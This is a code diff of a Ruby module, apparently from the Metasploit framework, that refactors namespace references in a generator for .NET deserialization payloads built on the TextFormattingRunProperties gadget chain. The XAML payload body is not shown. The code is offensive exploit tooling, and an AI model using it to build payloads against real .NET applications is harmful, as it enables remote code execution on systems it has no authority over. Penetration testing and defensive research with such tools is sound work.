@@ -13,8 +13,6 @@ module DotNetDeserialization
   DEFAULT_FORMATTER = :LosFormatter
   DEFAULT_GADGET_CHAIN = :TextFormattingRunProperties
 
-  #include Msf::Util::DotNetDeserialization::Enums
-
   def self.encode_7bit_int(int)
     # see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
     encoded_int = []
@@ -118,29 +116,29 @@ module DotNetDeserialization
       </ResourceDictionary>
       EOS
 
-      library = Types::BinaryLibrary.new(
+      library = Types::RecordValues::BinaryLibrary.new(
         library_id: 2,
         library_name: "Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
       )
 
       serialized = Types::SerializedStream.from_values([
-        Types::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
+        Types::RecordValues::SerializationHeaderRecord.new(root_id: 1, header_id: -1),
         library,
-        Types::ClassWithMembersAndTypes.from_member_values(
-          class_info: Types::ClassInfo.new(
+        Types::RecordValues::ClassWithMembersAndTypes.from_member_values(
+          class_info: Types::General::ClassInfo.new(
             obj_id: 1,
             name: 'Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties',
             member_names: ['ForegroundBrush']
           ),
-          member_type_info: Types::MemberTypeInfo.new(
+          member_type_info: Types::General::MemberTypeInfo.new(
             binary_type_enums: [Enums::BinaryTypeEnum[:String]]
           ),
           library_id: library.library_id,
           member_values: [
-              Types::Record.from_value(Types::BinaryObjectString.new(obj_id: 3, string: resource_dictionary))
+              Types::Record.from_value(Types::RecordValues::BinaryObjectString.new(obj_id: 3, string: resource_dictionary))
           ]
         ),
-        Types::MessageEnd.new
+        Types::RecordValues::MessageEnd.new
       ])
     else
       raise NotImplementedError, 'The specified gadget chain is not implemented'
